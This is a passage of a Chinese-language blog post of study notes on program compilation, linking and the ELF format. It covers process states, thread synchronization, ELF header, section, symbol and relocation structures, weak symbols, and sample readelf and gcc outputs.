创建了一个新进程，但是还没运行</li><li>就绪<br> 新建完成之后，相关资源分配完毕，等待运行</li><li>运行<br> CPU开始执行</li><li>阻塞<br> 由于等待其他资源、sleep操作等等原因，程序暂时退出CPU，等待阻塞条件不满足</li><li>死亡<br> 程序运行结束</li></ol><h3 id="僵死进程与孤儿进程"><a href="#僵死进程与孤儿进程" class="headerlink" title="僵死进程与孤儿进程"></a>僵死进程与孤儿进程</h3><p>僵死进程（僵尸进程）就是子进程在死亡之后，父进程没有调用wait或waitpid来获取死亡进程的状态信息，导致子进程的进程描述符等资源无法被释放<br>孤儿进程就是父进程死亡，子进程就变为了孤儿进程，此时Linux中孤儿进程将被init进程收养，子进程的状态信息将有它来收集（init进程是一个由内核启动的用户级进程，在完成了内核自行启动，也就是在内核装入内存，完成了驱动程序与数据结构的初始化之后，启动init进程，完成引导进程）</p><h3 id="Linux的多线程"><a href="#Linux的多线程" class="headerlink" title="Linux的多线程"></a>Linux的多线程</h3><table><thead><tr><th align="left">系统调用</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><code>fork</code></td><td align="left">复制当前进程，采用写时复制技术，速度块</td></tr><tr><td align="left"><code>exec</code></td><td align="left">使用新的可执行映像替代当前可执行映像，产生新任务</td></tr><tr><td align="left"><code>clone</code></td><td align="left">产生一个从制定位置开始运行，共享当前进程内存空间和文件的新线程</td></tr></tbody></table><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><ol><li>锁，读写独占；读写锁，读时共享，写时独占</li><li>信号量，限制访问资源的线程数，任意线程访问，任意线程释放；互斥量，类似信号量，不同在互斥量的获取与释放在同一个线程相互依存，不可分割</li><li>临界区，与信号量互斥量相似，但是作用范围仅限于本进程，其他进程无法访问临界区</li><li>条件变量，作用类似于栅栏，线程可以唤醒、等待条件变量，条件变量可以被多个线程等待，而条件变量被唤醒之后所有在等待的线程都可以继续执行</li></ol><h3 id="可重入函数"><a href="#可重入函数" class="headerlink" title="可重入函数"></a>可重入函数</h3><p>可重入也就是多个线程可以同时调用函数或者函数自己调用自己执行，但不影响执行效果的函数。可重入函数一般有如下条件</p><ol><li>不使用任何静态或局部的非const变量</li><li>不返回任何静态或全局的非const变量的指针</li><li>仅依赖于调用方提供的参数</li><li>不依赖任何单个资源的锁</li><li>不调用不可重入函数</li></ol><h3 id="volatile关键字与barrier"><a href="#volatile关键字与barrier" class="headerlink" title="volatile关键字与barrier"></a>volatile关键字与barrier</h3><p>二者主要是防止编译器的过度优化<br>volatile可以防止编译器为了提高速度将一个变量缓存都寄存器中而不写回<br>barrier，组织CPU将该指令之前的指令交换到该指令之后  </p><h1 id="2-编译与链接"><a href="#2-编译与链接" class="headerlink" title="2.编译与链接"></a>2.编译与链接</h1><h2 id="整个过程"><a href="#整个过程" class="headerlink" title="整个过程"></a>整个过程</h2><p>高级语言编译成为可执行文件主要包含四个步骤：</p><ol><li>预处理<code>gcc -E hello.c -o hello.i</code><br> 预处理（预编译）之后的文件拓展名是<code>.i</code>,其不包含任何宏定义，所有的宏定义已经被展开，其主要包含如下内容<ol><li>将所有的<code>#define</code>删除，并且展开所有的宏定义</li><li>处理所有条件预编译指令，如<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code>等等</li><li>处理<code>#include</code>预编译指令，将被包含的文件插入到预编译指令的位置，并迭代进行</li><li>删除所有的注释</li><li>添加行号与文件名标示，以便产生调试用的行号信息或在编译警告出错时能够显示行号</li><li>保留所有的<code>#pragma</code>编译器指令</li></ol></li><li>编译<code>gcc -S hello.i -o hello.s</code>，结果是生成依赖目标平台的汇编程序文本<br> 编译的结果是产生与源代码对应的汇编文件，文件拓展名是<code>.s</code>，编译的过程又可以分为如下几步：<ol><li>扫描<br> 扫描器的作用是进行词法分析，将源代码分割为一系列的记号，并进行分类，如关键字、标识符、字面量（数字，字符串等等）和特殊符号（加号，减号等等）</li><li>语法分析<br> 通过语法分析器，采用上下文无关语法对记号进行语法分析，产生以表达式为节点的语法树，最小表达式符号与数字往往作为树的叶节点</li><li>语义分析<br> 编译阶段主要做静态语义分析，通常包括声明与类型的匹配，类型的转换。除0操作是一个运行期的语义错误</li><li>源代码优化<br> 源码级优化器将源码转换为与平台无关的中间代码，可以优化编译期间可以确定的一些表达式如<code>int a=2+6；</code>，当然能优化的远不止此</li><li>代码生成<br> 由代码生成器将中间代码转换为依赖目标平台的目标机器代码</li><li>目标代码优化<br> 由目标代码优化器对目标代码进行优化</li></ol></li><li>汇编<code>gcc -c hello.s -o hello.o</code><br> 汇编的处理对象是汇编程序文本，结果是将汇编代码转换为机器可以执行的指令，生成目标文件，文件拓展名是<code>.o</code><pre><code class="console"> hello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</code></pre></li><li>链接<br> 链接的处理对象是可以重定位的二进制程序。经过上述过程的程序还不能够执行,程序中使用到的一些外部函数未能找到正确的地址。而生成可执行文件的最后一步便是链接</li></ol><p>编译过后生成的目标代码与汇编之后生成的目标文件怎么理解？<br>目标代码一般指汇编程序文本，目标文件则是可以重定位的二进制目标程序。一般不特指的话，可以将编译器理解为预处理器、编译器、汇编器的组合</p><h2 id="静态链接基本过程"><a href="#静态链接基本过程" class="headerlink" title="静态链接基本过程"></a>静态链接基本过程</h2><ol><li>地址与空间分配</li><li>符号决议（决议倾向于静态链接，绑定倾向于动态链接）</li><li>重定位</li></ol><h1 id="3-目标文件"><a href="#3-目标文件" class="headerlink" title="3.目标文件"></a>3.目标文件</h1><h2 id="目标文件格式"><a href="#目标文件格式" class="headerlink" title="目标文件格式"></a>目标文件格式</h2><p>PE与ELF文件格式都是基于COFF格式的。<br>补充一个小知识点：Windows下的可执行文件后缀有<code>exe</code>、<code>com</code>和<code>msi</code>  </p><h3 id="bss段"><a href="#bss段" class="headerlink" title="bss段"></a>bss段</h3><blockquote><p>bss段，主要是未初始化的全局变量和局部静态变量预留位置而已，它没有内容，在文件中不占用空间<br>这句话前面的还能理解，但是<code>在文件中不占用空间</code>就不明白了，文件中可以很直观的看出bss段的大小，按照其他大佬的博客所说，bss段并不给数据分配空间只是记录其大小，但为何在实际应用中又分配了空间（此处编译选项命令为<code>gcc -g -O0 test.c</code>）,到底怎么去理解<code>不占用可执行文件空间</code>  </p></blockquote><div align=center><img src="./2/bss段空间占用.png" alt="bss段空间占用" /></div><div align=center><img src="./2/bss段内容.png" alt="bss段内容"  /></div>看了大佬们的文章再实践发现实际的可执行文件中，bss段确实不占用空间，只在程序运行的时候自动初始化，其相关的符号及大小等保存在符号表中，但是又有新问题，可执行文件是连续的空间，bss段是怎么做到不占用文件空间的.[理解bss段为啥不占磁盘空间](https://www.jianshu.com/p/52c7445af23a)<div align=center><img src="./2/未初始化全局变量在符号表中的表现.png" alt="未初始化全局变量在符号表中的表现"  /></div>在段表中，BSS段独有`nobits`属性，也就是表示该节不包含任何数据，只占用空间。elf的外在表现是二进制文件，所看见的偏移量不过是根据elf文件格式展开后的结果，在存储的具有`nobits`属性的段的时候，其不占用任何文件空间。。。<h3 id="其他常见段"><a href="#其他常见段" class="headerlink" title="其他常见段"></a>其他常见段</h3><p><a href="https://i1arn.github.io/2020/03/01/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%AE%B5/">参看</a><br>gcc中可以通过在函数、变量定义前加上<code>__attribute__((section(&quot;name&quot;)))</code>来指定程序、变量所在的程序段</p><h2 id="ELF文件结构描述"><a href="#ELF文件结构描述" class="headerlink" title="ELF文件结构描述"></a>ELF文件结构描述</h2><p>ELF的文件结构依次大致是ELF头，各个逻辑段，段表，调试信息；</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头的格式定义如下：</p><pre><code class="c++">#define EI_NIDENT 16typedef struct {        unsigned char   e_ident[EI_NIDENT];   //16字节标识ELF文件的平台属性          Elf32_Half      e_type;               //ELF文件类型        Elf32_Half      e_machine;            //文件的目标平台        Elf32_Word      e_version;            //ELF版本号        Elf32_Addr      e_entry;              //Entry point address，ELF程序的入口地址        Elf32_Off       e_phoff;              //Start of program headers,        Elf32_Off       e_shoff;              //Start of section headers,段表在程序中的偏移量        Elf32_Word      e_flags;              //ELF标志位，用来标识一些ELF文件平台相关的属性        Elf32_Half      e_ehsize;             //Size of this header,ELF文件头的大小        Elf32_Half      e_phentsize;          //Size of program headers,        Elf32_Half      e_phnum;              //Number of program headers,        Elf32_Half      e_shentsize;          //Size of section headers,段表描述符的大小        Elf32_Half      e_shnum;              //Number of section headers,段表描述符的数量，即段的个数        Elf32_Half      e_shstrndx;           //Section header string table index，段表字符串表所在的段在段表中的下标} Elf32_Ehdr;</code></pre><p>elf文件头举例</p><pre><code class="console">$ readelf -h ./testELF Header:  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00   Class:                             ELF64  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           Advanced Micro Devices X86-64  Version:                           0x1  Entry point address:               0x530  Start of program headers:          64 (bytes into file)  Start of section headers:          48680 (bytes into file)  Flags:                             0x0  Size of this header:               64 (bytes)  Size of program headers:           56 (bytes)  Number of program headers:         9  Size of section headers:           64 (bytes)  Number of section headers:         34  Section header string table index: 33</code></pre><h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>段描述符的定义</p><pre><code class="c++">//! ELF32 Section header.typedef struct elf32_shdr{        Elf32_Word      sh_name;              //Section name,段名，存储的是字符串在.shstrtab段中的偏移量        Elf32_Word      sh_type;              //Section type，段的类型        Elf32_Word      sh_flags;             //Section flag，段的标志位        Elf32_Addr      sh_addr;              //Section addr，段虚拟地址，段在被加载之后存储段坐在的虚拟地址，否则为0        Elf32_Off       sh_offset;            //Section offset，段的偏移量        Elf32_Word      sh_size;              //Section size，段的大小        Elf32_Word      sh_link;              //Section link        Elf32_Word      sh_info;              //Section information        Elf32_Word      sh_addralign;         //Section address alignment，段地址对齐，存储指数倍数，即存3，则对齐数量是2**3=8，存1或0则无要求        Elf32_Word      sh_entsize;           //Section entry size，项的大小长度，为0则项的长度不定} elf32_shdr_t;</code></pre><p>段的类型<code>sh_type</code>主要有：  </p><table><thead><tr><th align="left">常量</th><th align="left">对应值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>SHT_NULL</code></td><td align="left">0</td><td align="left">无效段</td></tr><tr><td align="left"><code>SHT_PROGBITS</code></td><td align="left">1</td><td align="left">程序段，数据段也是这种类型</td></tr><tr><td align="left"><code>SHT_SYMTAB</code></td><td align="left">2</td><td align="left">符号表</td></tr><tr><td align="left"><code>SHT_STRTAB</code></td><td align="left">3</td><td align="left">字符串表</td></tr><tr><td align="left"><code>SHT_RELA</code></td><td align="left">4</td><td align="left">重定位表</td></tr><tr><td align="left"><code>SHT_HASH</code></td><td align="left">5</td><td align="left">符号表的哈希表</td></tr><tr><td align="left"><code>SHT_DYNAMIC</code></td><td align="left">6</td><td align="left">动态链接信息</td></tr><tr><td align="left"><code>SHT_NOTE</code></td><td align="left">7</td><td align="left">提示性信息</td></tr><tr><td align="left"><code>SHT_NOBITS</code></td><td align="left">8</td><td align="left">该段没有内容，如.bss段</td></tr><tr><td align="left"><code>SHT_REL</code></td><td align="left">9</td><td align="left">包含重定位信息</td></tr><tr><td align="left"><code>SHT_SHLIB</code></td><td align="left">10</td><td align="left">保留</td></tr><tr><td align="left"><code>SHT_DYNSYM</code></td><td align="left">11</td><td align="left">动态链接的符号表</td></tr></tbody></table><p>段的标志位<code>sh_flags</code>主要有：  </p><table><thead><tr><th align="left">常量</th><th align="left">对应值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>SHF_WRITE</code></td><td align="left">1</td><td align="left">该段在进程空间中可写</td></tr><tr><td align="left"><code>SHF_ALLOC</code></td><td align="left">2</td><td align="left">该段在进程空间中需要分配信息，如.bss段,.data段等等</td></tr><tr><td align="left"><code>SHF_EXECINSTR</code></td><td align="left">4</td><td align="left">该段在进程空间中可以被执行，一般指代码段</td></tr></tbody></table><p>段的链接信息<code>sh_link</code>，<code>sh_info</code>平时没怎么注意观察，这里做一个记录留个印象  </p><table><thead><tr><th align="left">sh_type</th><th align="left">sh_link</th><th align="left">sh_info</th></tr></thead><tbody><tr><td align="left"><code>SHT_DYNAMIC</code></td><td align="left">该段所使用的字符串表在段表中的下标</td><td align="left">0</td></tr><tr><td align="left"><code>SHT_HASH</code></td><td align="left">该段所使用的符号表在段表中的下标</td><td align="left">0</td></tr><tr><td align="left"><code>SHT_REL</code><br><code>SHT_RELA</code></td><td align="left">该段所使用的相应的符号表在段表中的下标</td><td align="left">该重定位表所作用的段在段表中的下标</td></tr><tr><td align="left"><code>SHT_SYMTAB</code><br><code>SHT_DYNSYM</code></td><td align="left">操作系统相关的</td><td align="left">操作系统相关的</td></tr><tr><td align="left">other</td><td align="left"><code>SHN_UNDEF</code></td><td align="left">0</td></tr></tbody></table><h3 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h3><p>字符串表：保存普通字符串<br>段表字符串表：用来保存段表中使用到的字符串，常见的如段名  </p><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><p>链接中，函数与变量统称为符号  </p><h3 id="ELF符号表结构"><a href="#ELF符号表结构" class="headerlink" title="ELF符号表结构"></a>ELF符号表结构</h3><pre><code class="c++">typedef struct {    Elf32_Word     st_name;        //符号名，存储该符号在字符串表中的下标    Elf32_Addr     st_value;       //符号对应值    Elf32_Word     st_size;        //符号大小    unsigned char     st_info;    //符号的类型与绑定信息    unsigned char     st_other;   //暂时为0，保留使用    Elf32_Half     st_shndx;       //符号所在的段} Elf32_Sym;</code></pre><p><code>st_info</code>的低四位表示符号类型，高28位表示符号绑定信息  </p><h4 id="符号绑定信息"><a href="#符号绑定信息" class="headerlink" title="符号绑定信息"></a>符号绑定信息</h4><p>主要有如下几种：  </p><table><thead><tr><th align="left">宏定义名</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>STB_LOCAL</code></td><td align="left">0</td><td align="left">局部符号，对目标文件的外部不可见</td></tr><tr><td align="left"><code>STB_GLOBAL</code></td><td align="left">1</td><td align="left">全局符号，外部可见</td></tr><tr><td align="left"><code>STB_WEAK</code></td><td align="left">2</td><td align="left">若引用</td></tr></tbody></table><h4 id="符号类型"><a href="#符号类型" class="headerlink" title="符号类型"></a><span id = "符号类型">符号类型</span></h4><table><thead><tr><th align="left">宏定义名</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>STT_NOTYPE</code></td><td align="left">0</td><td align="left">未知类型符号</td></tr><tr><td align="left"><code>STT_OBJECT</code></td><td align="left">1</td><td align="left">该符号是数据对象</td></tr><tr><td align="left"><code>STT_FUNC</code></td><td align="left">2</td><td align="left">该符号是函数或者可执行代码</td></tr><tr><td align="left"><code>STT_SECTION</code></td><td align="left">3</td><td align="left">该符号是一个段，但这个符号必须是局部符号<code>STB_LOCAL</code></td></tr><tr><td align="left"><code>STT_FILE</code></td><td align="left">4</td><td align="left">该符号为文件名，一般是该目标文件对应的源文件名，<br>但要求一定是局部符号，并且符号所在的段<code>st_shndx</code>一定是<code>SHN_ABS</code></td></tr></tbody></table><h4 id="符号所在段"><a href="#符号所在段" class="headerlink" title="符号所在段"></a>符号所在段</h4><p>一般情况下，<code>sh_shndx</code>的值表示该符号所在段在段表中的下标，但是当符号不是定义在本文件中，或一些特殊符号有一些特殊的值  </p><table><thead><tr><th align="left">宏定义名</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>SHN_ABS</code></td><td align="left">0xfff1</td><td align="left">表示该符号表示了一个绝对的值，如表示文件名的符号</td></tr><tr><td align="left"><code>SHN_COMMON</code></td><td align="left">0xfff2</td><td align="left">表示该符号是一个“common块”类型的符号</td></tr><tr><td align="left"><code>SHN_UNDEF</code></td><td align="left">0</td><td align="left">改符号未定义，在本目标文件中使用到了，但是定义在其他目标文件中</td></tr></tbody></table><h4 id="符号表举例"><a href="#符号表举例" class="headerlink" title="符号表举例"></a>符号表举例</h4><pre><code class="console">$ readelf -s ./a.out Symbol table &#39;.dynsym&#39; contains 7 entries:   Num:    Value          Size Type    Bind   Vis      Ndx Name     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND      1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable     6: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5 (2)Symbol table &#39;.symtab&#39; contains 69 entries:   Num:    Value          Size Type    Bind   Vis      Ndx Name     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND      1: 0000000000000238     0 SECTION LOCAL  DEFAULT    1      2: 0000000000000254     0 SECTION LOCAL  DEFAULT    2     ……    31: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c    32: 0000000000000560     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones    33: 00000000000005a0     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones    34: 00000000000005f0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux    35: 0000000000201020     1 OBJECT  LOCAL  DEFAULT   24 completed.7698    36: 0000000000200dc0     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin    37: 0000000000000630     0 FUNC    LOCAL  DEFAULT   14 frame_dummy    38: 0000000000200db8     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_    39: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS test.c    40: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c    41: 0000000000000834     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__    42: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS     43: 0000000000200dc0     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end    44: 0000000000200dc8     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC    45: 0000000000200db8     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start    46: 00000000000006f4     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR    47: 0000000000200fb8     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_    48: 00000000000006d0     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini    49: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab    50: 0000000000201000     0 NOTYPE  WEAK   DEFAULT   23 data_start    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5    52: 0000000000201010     0 NOTYPE  GLOBAL DEFAULT   23 _edata    53: 00000000000006d4     0 FUNC    GLOBAL DEFAULT   15 _fini    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_    55: 0000000000201000     0 NOTYPE  GLOBAL DEFAULT   23 __data_start    56: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__    57: 0000000000201008     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle    58: 00000000000006e0     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used    59: 0000000000000660   101 FUNC    GLOBAL DEFAULT   14 __libc_csu_init    60: 000000000020ac80     0 NOTYPE  GLOBAL DEFAULT   24 _end    61: 0000000000000530    43 FUNC    GLOBAL DEFAULT   14 _start    62: 0000000000201040 40000 OBJECT  GLOBAL DEFAULT   24 a    63: 0000000000201010     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start    64: 000000000000063a    23 FUNC    GLOBAL DEFAULT   14 main    65: 0000000000201010     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__    66: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable    67: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@@GLIBC_2.2    68: 00000000000004e8     0 FUNC    GLOBAL DEFAULT   11 _init</code></pre><h4 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h4><p>书中提到了<code>__executable_start</code>,该符号为程序起始地址，就是程序的$base虚拟基地址，不同于程序的入口地址  </p><h4 id="弱符号与强符号"><a href="#弱符号与强符号" class="headerlink" title="弱符号与强符号"></a>弱符号与强符号</h4><p>GCC中可以通过在定义时加上<code>__attribute__((weak))</code>来定义弱符号<br>总结起来就是：</p><ol><li>不允许强符号被多次定义，否则编译器报错</li><li>强+弱，选择强符号</li><li>多个弱，选择占用空间最大的一个</li></ol><h4 id="弱引用与强引用"><a href="#弱引用与强引用" class="headerlink" title="弱引用与强引用"></a>弱引用与强引用</h4><p>弱引用：GCC中通过在引用时加上<code>__attribute__((weakref))</code>来说明弱引用，若该符号有定义则链接器将该符号的引用决议，如没有定义，则链接器不报错<br>强引用：没有找到该符号定义，则链接器报错  </p><p>书中给定的例子，实际出现了些许不同</p><pre><code class="c++">#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;int pthread_create(pthread_t *thread, const pthread_attr_t *attr,                          void *(*start_routine) (void *), void *arg)  __attribute__((weak));int main(){    if(pthread_create)    {        printf(&quot;multi-thread\n&quot;);    }    else        printf(&quot;single-thread.\n&quot;);    return 1;}</code></pre><p>按照书中给出的两种编译选项<code>gcc pthread.c -o pt</code>与<code>gcc pthread -lpthread -o pt</code>，执行之后应该出现两种不通的结果，但是并没有，都是打印的“single-thread”，再将<code>pthread_create</code>更换为弱引用之后，执行结果都是”multi-thread”. 若直接取消弱符号声明，则都打印”multi-thread”。<br>满脑子的困惑，gcc直接优化（？）掉了if判断，生成的main函数直接执行了puts打印<br><a href="https://i1arn.github.io/2020/05/13/%E5%BC%B1%E7%AC%A6%E5%8F%B7%E4%B8%8E%E5%BC%B1%E5%BC%95%E7%94%A8/">跳转到专题</a></p><h1 id="4-静态链接"><a href="#4-静态链接" class="headerlink" title="4.静态链接"></a>4.静态链接</h1><h2 id="4-1空间与地址分配"><a href="#4-1空间与地址分配" class="headerlink" title="4.1空间与地址分配"></a>4.1空间与地址分配</h2><h3 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h3><p>两步连接：</p><ol><li>空间与地址分配<br> 空间指虚拟地址空间分配，将相似段合并，对符号定义与符号引用进行收集，放入全局符号表</li><li>符号解析与重定位</li></ol><h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><p>各个符号在段内的相对地址是确定的，通过链接器给符号加上一个偏移量就可以使它们调整到正确的虚拟地址了</p><h2 id="4-2符号解析与重定位"><a href="#4-2符号解析与重定位" class="headerlink" title="4.2符号解析与重定位"></a>4.2符号解析与重定位</h2><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>call指令是一条近址相对位移调用指令，他后面跟的是调用指令的下一条指令的偏移量</p><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>结构：</p><pre><code class="c++">typedef struct {        Elf32_Addr      r_offset;  //重定位入口的偏移量        Elf32_Word      r_info;    //重定位入口的类型与符号，低8位为类型，高24位为重定位入口的符号在符号表中的下标} Elf32_Rel;typedef struct {        Elf32_Addr      r_offset;        Elf32_Word      r_info;        Elf32_Sword     r_addend;   //计算求值时的常量加数} Elf32_Rela;</code></pre><h3 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h3><p>在链接器扫描完所有的输入目标文件之后，所有<code>SHN_UNDEF</code>符号都应该能在全局符号表中找到，否则出现符号未定义错误  </p><h3 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h3><p>书中给出了两种x86下的重定位基本类型：</p><table><thead><tr><th align="left">宏定义名</th><th align="left">值</th><th align="left">重定位修正方法</th></tr></thead><tbody><tr><td align="left"><code>R_386_32</code></td><td align="left">1</td><td align="left">绝对寻址修正 S+A</td></tr><tr><td align="left"><code>R_386_PC32</code></td><td align="left">2</td><td align="left">相对寻址修正 S+A-P</td></tr></tbody></table><blockquote><p>A：保存在被修正位置的值<br>P：被修正的位置（相对于段开始的偏移量或者虚拟地址），可通过<code>r_offset</code>计算得到，也就是偏移量<br>S：符号的实际地址，就是<code>r_info</code>的高24位</p></blockquote><p>实际中肯定不止这两种类型，还有  </p><pre><code class="c++">#define R_X86_64_NONE 0         /* No reloc */#define R_X86_64_64 1           /* Direct 64 bit */#define R_X86_64_PC32 2         /* PC relative 32 bit signed */#define R_X86_64_GOT32 3        /* 32 bit GOT entry */#define R_X86_64_PLT32 4        /* 32 bit PLT address */#define R_X86_64_COPY 5         /* Copy symbol at runtime */#define R_X86_64_GLOB_DAT 6     /* Create GOT entry */#define R_X86_64_JUMP_SLOT 7    /* Create PLT entry */#define R_X86_64_RELATIVE 8     /* Adjust by program base */#define R_X86_64_GOTPCREL 9     /* 32 bit signed pc relative offset to GOT */</code></pre><p>参考：<br><a href="https://bbs.pediy.com/thread-246373.htm" target="_blank" rel="noopener">32位elf格式中的10种重定位类型</a>  </p><h3 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h3><p>不同于未初始化的局部静态变量，编译器在处理未初始化的全局变量时，将其视为弱符号，由于可能存在多个编译单元定义该符号，无法确定最终符号占用空间大小，所以无法为弱符号在BSS段分配空间。但链接器在完成了所有输入文件的扫描之后，弱符号的最终大小可以确定，于是在最终输出文件的BSS段为其分配了空间</p><h2 id="4-4C-相关"><a href="#4-4C-相关" class="headerlink" title="4.4C++相关"></a>4.4C++相关</h2><h3 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h3><p>.init段，main函数执行前，glib的初始化部分安排执行这个段中的代码<br>.fini段，main函数正常退出时，glib安排执行这个段中的代码  </p><h3 id="C-与ABI"><a href="#C-与ABI" class="headerlink" title="C++与ABI"></a>C++与ABI</h3><p>API：源代码级别的接口<br>ABI：二进制层面的接口  </p><h2 id="4-5静态库链接"><a href="#4-5静态库链接" class="headerlink" title="4.5静态库链接"></a>4.5静态库链接</h2><pre><code class="console">$ gcc ptest.c --static --verbose  -g -lpthread -o ptUsing built-in specs.COLLECT_GCC=gccCOLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapperOFFLOAD_TARGET_NAMES=nvptx-noneOFFLOAD_TARGET_DEFAULT=1Target: x86_64-linux-gnuConfigured with: ../src/configure -v --with-pkgversion=&#39;Ubuntu 7.5.0-3ubuntu1~18.04&#39; --with-bugurl=file:///usr/share/doc/gcc-7/README.Bugs --enable-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++ --prefix=/usr --with-gcc-major-version-only --program-suffix=-7 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-bootstrap --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --enable-default-pie --with-system-zlib --with-target-system-zlib --enable-objc-gc=auto --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnuThread model: posixgcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04) COLLECT_GCC_OPTIONS=&#39;-static&#39; &#39;-v&#39; &#39;-g&#39; &#39;-o&#39; &#39;pt&#39; &#39;-mtune=generic&#39; &#39;-march=x86-64&#39; /usr/lib/gcc/x86_64-linux-gnu/7/cc1 -quiet -v -imultiarch x86_64-linux-gnu ptest.c -quiet -dumpbase ptest.c -mtune=generic -march=x86-64 -auxbase ptest -g -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/cc2UYrxH.sGNU C11 (Ubuntu 7.5.0-3ubuntu1~18.04) version 7.5.0 (x86_64-linux-gnu)    compiled by GNU C version 7.5.0, GMP version 6.1.2, MPFR version 4.0.1, MPC version 1.1.0, isl version isl-0.19-GMPGGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;ignoring nonexistent directory &quot;/usr/local/include&quot;ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/7/../../../../x86_64-linux-gnu/include&quot;#include &quot;...&quot; search starts here:#include &lt;...&gt; search starts here: /usr/lib/gcc/x86_64-linux-gnu/7/include /usr/lib/gcc/x86_64-linux-gnu/7/include-fixed /usr/include/x86_64-linux-gnu /usr/includeEnd of search list.GNU C11 (Ubuntu 7.5.0-3ubuntu1~18.04) version 7.5.0 (x86_64-linux-gnu)    compiled by GNU C version 7.5.0, GMP version 6.1.2, MPFR version 4.0.1, MPC version 1.1.0, isl version isl-0.19-GMPGGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072Compiler executable checksum: b62ed4a2880cd4159476ea8293b72fa8ptest.c: In function 